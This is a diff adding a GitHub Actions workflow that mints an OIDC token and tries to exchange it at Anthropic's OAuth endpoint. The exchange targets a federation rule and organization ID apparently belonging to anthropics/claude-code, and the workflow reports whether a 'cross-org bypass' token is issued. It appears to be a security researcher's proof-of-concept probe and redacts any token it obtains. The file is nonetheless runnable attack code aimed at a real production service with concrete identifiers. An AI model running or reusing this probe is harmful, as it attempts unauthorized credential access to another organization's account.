@@ -1,0 +1,27 @@
+name: wif-claim-pin-test
+on:
+  push: { branches: [main] }
+  workflow_dispatch: {}
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint OIDC (aud=api.anthropic.com) and attempt Anthropic WIF exchange
+        run: |
+          set -e
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fapi.anthropic.com" | jq -r '.value')
+          echo "=== OIDC token claims (proves attacker-repo identity) ==="
+          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
+            | jq '{iss,aud,repository,repository_owner,sub,job_workflow_ref}' || echo "(decode note)"
+          echo "=== Attempt exchange against anthropics/claude-code federation rule ==="
+          RESP=$(curl -s -w "\nHTTP_%{http_code}" -X POST https://api.anthropic.com/v1/oauth/token \
+            -H "Content-Type: application/json" \
+            -H "anthropic-beta: oauth-2025-04-20,oidc-federation-2026-04-01" \
+            -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:jwt-bearer\",\"assertion\":\"$OIDC\",\"federation_rule_id\":\"fdrl_01PMxmPzoBQnaCfGSuk46Pjt\",\"organization_id\":\"1ec12c5c-6542-4da8-bf2f-c15919aef01c\"}")
+          # redact any issued token to first 10 chars
+          echo "$RESP" | sed -E 's/("access_token":"[A-Za-z0-9_-]{10})[^"]*/\1...REDACTED/g'
+          echo "$RESP" | grep -q 'HTTP_200' && echo "!!! RESULT: TOKEN ISSUED -> CROSS-ORG BYPASS (CRITICAL)" || echo "RESULT: rejected (rule appears properly pinned)"
